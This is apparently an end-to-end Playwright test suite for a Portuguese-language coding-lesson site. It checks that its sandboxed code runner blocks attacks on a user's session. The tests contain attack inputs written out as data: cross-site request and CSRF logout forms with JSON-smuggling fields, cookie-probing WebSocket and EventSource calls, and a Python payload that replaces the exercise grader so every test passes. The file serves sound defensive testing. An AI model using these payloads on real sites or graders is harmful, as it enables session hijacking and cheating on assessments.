await tentar('worker do site', () => new Promise((res, rej) => { const w = new Worker(O + '/runner.js?ataque=worker'); w.onerror = (x) => { x.preventDefault(); rej(erro('ErroWorker')); }; setTimeout(() => res('CRIADO'), 1000); }));
await tentar('EventSource', () => new Promise((res, rej) => { const s = new EventSource(O + '/api/auth/me?ataque=sse', { withCredentials: true }); s.onopen = () => res('ABERTO'); s.onerror = () => { s.close(); rej(erro('ErroEventSource')); }; }));
console.log(linhas.join('\\n'));
console.log('FIM');
`;
}

for (const semCsp of [false, true]) {
  test(`WebSocket, EventSource, importScripts, worker do site e POST no-cors sem x-alicerce não tocam a conta${semCsp ? ' (sem a CSP)' : ''}`, async ({ browser, baseURL, conta }) => {
    const eco = await servidorEco();
    const context = await browser.newContext({ bypassCSP: semCsp, baseURL: baseURL! });
    const page = await context.newPage();
    const { email } = await criarConta(page, conta);
    const vistas = vigiarAtaque(context);
    await page.goto(lab('javascript', ataqueSemFetch(baseURL!, eco.url)));
    const out = await rodar(page, 'FIM', 30_000);
    const linhas = out.split('\n').filter((l) => / (bloqueado|ENVIADO|ABERTO|CARREGOU|CRIADO)/.test(l));
    expect(linhas.length, out).toBe(9);
    for (const l of linhas) expect(l).toMatch(/: bloqueado \(/);
    expect(out).not.toContain(email);
    await page.waitForTimeout(500);
    // Nada saiu com o cookie da sessão, e nenhuma mutação teve resposta legível.
    semCookieNemMutacao(vistas());
    if (!semCsp) {
      // Com a CSP, só sai o GET do importScripts (script-src 'self'), sem cookie; o resto para antes da rede.
      for (const v of vistas()) expect(v).toMatch(/ falhou csp$|ataque=importScripts cookie=não falhou/);
      expect(eco.recebidas).toEqual([]);
    } else {
      // Sem a CSP, os POST no-cors chegam ao servidor, mas da origem "null" e sem cookie: não há sessão para encerrar.
      expect(vistas().filter((v) => v.startsWith('POST ')).length).toBe(4);
      // O WebSocket para o eco sai, mas da origem "null" e sem cookie (o eco recusa o upgrade).
      expect(eco.recebidas).toEqual([expect.stringMatching(/^UPGRADE \/\?ataque=ws-eco cookie=não origin=null$/)]);
    }
    await contaIntacta(page, email);
    await context.close();
    await eco.fechar();
  });
}

test('mesmo na thread da página de execução: sem janelas, sem navegar o site, sem formulários e sem cookie ao navegar o próprio iframe', async ({ page, context, baseURL, conta }) => {
  test.setTimeout(90_000);
  const { email } = await criarConta(page, conta);
  await page.goto('/laboratorio');
  await page.getByRole('button', { name: 'JavaScript' }).click();
  await escrever(page, 'console.log("aquecendo")');
  await rodar(page, 'aquecendo');
  const vistas = vigiarAtaque(context);
  const frame = page.frames().find((f) => f.url().includes('runner.html'))!;
  expect(frame).toBeTruthy();
  // Simula um código que tivesse escapado do worker para a thread do iframe (o que o protocolo não permite).
  const r = await frame.evaluate(async (O) => {
    const out: Record<string, string> = {};
    try {
      out.open = window.open(O + '/api/auth/me?ataque=open') === null ? 'null' : 'ABRIU';
    } catch (e) {
      out.open = 'erro ' + (e as Error).name;
    }
    try {
      (top as Window).location.href = O + '/api/auth/me?ataque=top';
      out.top = 'SEM ERRO';
    } catch (e) {
      out.top = 'erro ' + (e as Error).name;
    }
    for (const alvo of ['_top', '_self']) {
      const f = document.createElement('form');
      f.method = 'POST';
      f.action = O + '/api/auth/logout?ataque=form' + alvo;
      f.target = alvo;
      document.body.append(f);
      f.submit();
    }
    const img = new Image();
    img.src = O + '/api/auth/me?ataque=img';
    await new Promise((res) => {
      img.onload = img.onerror = res;
      setTimeout(res, 1000);
    });
    out.img = String(img.naturalWidth);
    // um segundo "pronto" forjado não rende outro canal
    const porta = await new Promise<string>((res) => {
      addEventListener('message', (e) => e.ports.length && res('RECEBEU PORTA'));
      parent.postMessage({ alicerce: 'runner', type: 'pronto', v: 1, n: location.hash.slice(1) }, '*');
      setTimeout(() => res('sem porta'), 1000);
    });
    out.porta = porta;
    return out;
  }, baseURL!);
  expect(r).toEqual({ open: 'null', top: 'erro SecurityError', img: '0', porta: 'sem porta' });
  await page.waitForTimeout(1000);
  expect(context.pages()).toHaveLength(1);
  expect(page.url()).toContain('/laboratorio');
  // A navegação do próprio iframe sai como GET sem cookie, e a resposta da API não é exibida (X-Frame-Options DENY).
  await frame.evaluate((O) => {
    location.href = O + '/api/auth/me?ataque=nav';
  }, baseURL!);
  await expect.poll(() => vistas().some((v) => v.includes('ataque=nav'))).toBe(true);
  const todas = vistas();
  expect(todas.some((v) => v.includes('ataque=form') || v.includes('ataque=open') || v.includes('ataque=top')), todas.join('\n')).toBe(false);
  semCookieNemMutacao(todas);
  await contaIntacta(page, email);
  // O canal morreu com a navegação: a próxima execução estoura o tempo, o site recria o iframe e a seguinte funciona.
  await escrever(page, 'console.log("depois", 6 * 7)');
  await executar(page).click();
  await expect(page.getByText('O programa não terminou a tempo').first()).toBeVisible({ timeout: 15_000 });
  await rodar(page, 'depois 42');
});

test('formulário de uma página do mesmo site (outra porta) não encerra a sessão, nem com o caminho codificado', async ({ page, context, baseURL, conta }) => {
  // 127.0.0.1:outra-porta é o mesmo "site" para o SameSite=Lax: o cookie vai junto num POST de formulário
  // de primeiro nível. Quem barra é o cabeçalho x-alicerce, que um formulário não envia.
  const { email } = await criarConta(page, conta);
  const alvos = ['/api/auth/logout', '/%61pi/auth/logout', '/%61pi/tutor'];
  const srv = createServer((req, res) => {
    const i = Number(new URL(req.url ?? '/', 'http://x').searchParams.get('i'));
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }).end(
      `<!doctype html><meta charset="utf-8"><form id="f" method="POST" enctype="text/plain" action="${baseURL}${alvos[i]}?ataque=csrf${i}"><input name='{"question":"oi","a":"' value='"}'></form><script>document.getElementById('f').submit()</script>`,
    );
  });
  await new Promise<void>((r) => srv.listen(0, '127.0.0.1', r));
  const vistas = vigiarAtaque(context);
  for (let i = 0; i < alvos.length; i++) {
    await page.goto(`http://127.0.0.1:${(srv.address() as AddressInfo).port}/?i=${i}`, { waitUntil: 'commit' });
    await expect.poll(() => vistas().some((v) => v.includes(`ataque=csrf${i} cookie=`) && !v.endsWith('pendente'))).toBe(true);
  }
  expect(vistas()).toHaveLength(alvos.length);
  for (const v of vistas()) expect(v).toMatch(/^POST .* cookie=sim HTTP 403$/);
  await contaIntacta(page, email);
  await new Promise<void>((r) => srv.close(() => r()));
});

test('resultado forjado pelo próprio código do estudante também passa pelo teto e pela conferência de formato', async ({ page }) => {
  // O código do estudante fala direto com a página de execução, sem passar pelo limite de dentro do worker.
  await page.goto(lab('javascript', 'postMessage({ result: { ok: true, stdout: "y".repeat(1_000_000), error: null } });\nawait new Promise(() => {});'));
  await page.reload();
  const out = await rodar(page, 'saída cortada', 20_000);
  expect(out.length).toBeLessThan(65_536 + 200);
  await escrever(page, 'postMessage({ result: "lixo" });\nawait new Promise(() => {});');
  await executar(page).click();
  await expect(page.getByText(/formato inesperado/).first()).toBeVisible({ timeout: 10_000 });
  await escrever(page, 'console.log("js normal", 6 * 7)');
  await rodar(page, 'js normal 42');
});

test('link do laboratório não altera a correção dos exercícios feitos depois, na mesma aba', async ({ page }) => {
  test.setTimeout(150_000);
  // O código do link troca a função que corrige: daí em diante todo teste "passaria".
  const veneno = [
    'import __main__, json',
    'def falso(code, tests, stdin, trace):',
    '    t = json.loads(tests)',
    '    return json.dumps({"ok": True, "phase": "tests" if t else "run", "stdout": "", "error": None, "steps": [],',
    '                       "tests": [{"name": x["name"], "passed": True, "message": ""} for x in t]})',
    '__main__.run = falso',
    'print("veneno instalado")',
  ].join('\n');
  await page.goto(lab('python', veneno));
  await rodar(page, 'veneno instalado', 90_000);
  // Sem recarregar a página (navegação do próprio site), vai ao desafio de uma lição e testa o código inicial, que está errado.
  await page.evaluate(() => {
    (window as unknown as { semRecarregar: boolean }).semRecarregar = true;
    history.pushState(null, '', '/licao/l1-algoritmos?etapa=desafio');
    dispatchEvent(new PopStateEvent('popstate'));
  });
  const ex = page.locator('section.exercise#e1-alg-desafio');
  await ex.getByRole('button', { name: /Testar/ }).click();
  await expect(ex.getByText(/Testes: \d+ de 4 passaram/)).toBeVisible({ timeout: 90_000 });
  expect(await page.evaluate(() => (window as unknown as { semRecarregar?: boolean }).semRecarregar)).toBe(true);
  await expect(ex.getByText('Testes: 0 de 4 passaram')).toBeVisible();
  await expect(ex.getByText('✓ Resolvido')).toHaveCount(0);
});

test('link do laboratório ainda em andamento também não altera a correção de um exercício testado logo depois', async ({ page }) => {
  test.setTimeout(150_000);
  // Antes, a separação era decidida na chamada, não no envio: com o Python ainda iniciando, o
  // pedido do laboratório podia entrar na fila depois de o iframe ter sido trocado e rodar no
  // mesmo iframe do exercício.
  const veneno = [
    'import __main__, json',
    'def falso(code, tests, stdin, trace):',
    '    t = json.loads(tests)',
    '    return json.dumps({"ok": True, "phase": "tests" if t else "run", "stdout": "", "error": None, "steps": [],',
    '                       "tests": [{"name": x["name"], "passed": True, "message": ""} for x in t]})',
    '__main__.run = falso',
    'print("veneno instalado")',
  ].join('\n');
  await page.goto(lab('python', veneno));
  await executar(page).click(); // não espera: o Python ainda está iniciando
  await page.evaluate(() => {
    history.pushState(null, '', '/licao/l1-algoritmos?etapa=desafio');
    dispatchEvent(new PopStateEvent('popstate'));
  });
  const ex = page.locator('section.exercise#e1-alg-desafio');
  await ex.getByRole('button', { name: /Testar/ }).click();
  await expect(ex.getByText(/Testes: \d+ de 4 passaram/)).toBeVisible({ timeout: 90_000 });
  await expect(ex.getByText('Testes: 0 de 4 passaram')).toBeVisible();
  await expect(ex.getByText('✓ Resolvido')).toHaveCount(0);
});

test('erro num callback do Python entre execuções e enxurrada de mensagens não deixam o Python inutilizável', async ({ page }) => {
  test.setTimeout(150_000);
  // 1) Um callback agendado pelo estudante lança erro depois do fim da execução: o worker do Python cai.
  await page.goto(lab('python', 'from js import setTimeout\nfrom pyodide.ffi import create_proxy\ndef boom():\n    raise ValueError("boom")\nsetTimeout(create_proxy(boom), 10)\nprint("agendado")'));
  await rodar(page, 'agendado', 90_000);
  await page.waitForTimeout(1000);
  await escrever(page, 'print("de volta", 6 * 7)');
  await rodar(page, 'de volta 42', 90_000);

  // 2) Enxurrada de mensagens para a página de execução: o Python é encerrado logo, sem esperar o tempo limite.
  await escrever(page, 'from js import postMessage, Object\nfrom pyodide.ffi import to_js\nm = to_js({"id": 999999, "ok": True, "result": "x" * 100000}, dict_converter=Object.fromEntries)\nwhile True:\n    postMessage(m)\n');
  const inicio = Date.now();
  await executar(page).click();
  await expect(page.getByText(/mensagem inesperada/).first()).toBeVisible({ timeout: 20_000 });
  expect(Date.now() - inicio).toBeLessThan(6_000);
  await escrever(page, 'print("de volta de novo", 6 * 7)');
  await rodar(page, 'de volta de novo 42', 90_000);
});

/** O servidor do e2e carregou o repositório privado (níveis 2 a 14)? O CI público roda sem ele. */
async function conteudoPagoNoServidor(request: APIRequestContext) {
  return ((await (await request.get('/api/health')).json()) as { conteudoPago?: string }).conteudoPago === 'disponivel';
}

test('exercício de JavaScript de uma lição Premium (entregue pelo servidor) é corrigido e roda de verdade', async ({ page, conta, request }) => {
  // Os exercícios de JavaScript estão nas lições Premium, que só o servidor entrega a quem tem o plano.
  // O plano é concedido no banco descartável do servidor do e2e (DATABASE_PATH de playwright.config.ts).
  test.skip(
    !(await conteudoPagoNoServidor(request)),
    'precisa do repositório privado no servidor do e2e: os níveis 0 e 1 não têm exercício de JavaScript. Rode com ALICERCE_PREMIUM_DIR (ou premium/ na raiz). Sem ele, o teste seguinte confere a recusa.',
  );
  const { email } = await criarConta(page, conta);
  execFileSync(process.execPath, ['--disable-warning=ExperimentalWarning', 'apps/api/scripts/plano.ts', email, 'premium', '1'], {
    env: { ...process.env, DATABASE_PATH: 'test-results/e2e.db' },
  });
  await page.goto('/licao/l6-javascript-dom');
  await expect(page.locator('#stage-title')).toBeVisible({ timeout: 20_000 });
  await page.getByRole('navigation', { name: 'Etapas da lição' }).getByRole('link', { name: /Exercícios/ }).click();
  await expect(page.locator('#stage-title')).toContainText('Exercícios');
  const ex = page.locator('section.exercise#e6-js-1');
  const campo = ex.getByLabel(/O que aparece na tela/);
  await campo.fill('2,4');
  await ex.getByRole('button', { name: 'Verificar' }).click();
  await expect(ex.getByText('Não é essa a saída.')).toBeVisible();
  await campo.fill('20,40');
  await ex.getByRole('button', { name: 'Verificar' }).click();
  await expect(ex.getByText('✓ Resolvido')).toBeVisible();
  await ex.getByRole('button', { name: /Executar de verdade/ }).click();
  await expect(ex.locator('pre.output').last()).toHaveText('20,40', { timeout: 20_000 });
  // rodou na página de execução, de origem opaca
  const frame = page.frames().find((f) => f.url().includes('runner.html'));
  expect(await frame!.evaluate(() => self.origin)).toBe('null');
});

test('sem o conteúdo pago no servidor, quem tem Premium ativo vê o aviso de indisponível, e nenhum exercício', async ({ page, conta, request }) => {
  test.skip(await conteudoPagoNoServidor(request), 'o servidor do e2e tem o conteúdo pago: o teste anterior abre a lição de verdade');
  const { email } = await criarConta(page, conta);
  execFileSync(process.execPath, ['--disable-warning=ExperimentalWarning', 'apps/api/scripts/plano.ts', email, 'premium', '1'], {
    env: { ...process.env, DATABASE_PATH: 'test-results/e2e.db' },
  });
  const resposta = page.waitForResponse((r) => r.url().endsWith('/api/content/lessons/l6-javascript-dom'));
  await page.goto('/licao/l6-javascript-dom');
  expect((await resposta).status()).toBe(503);
  await expect(page.getByRole('alert')).toContainText('O conteúdo do Premium está temporariamente indisponível neste servidor.');
  await expect(page.locator('section.exercise')).toHaveCount(0);
});
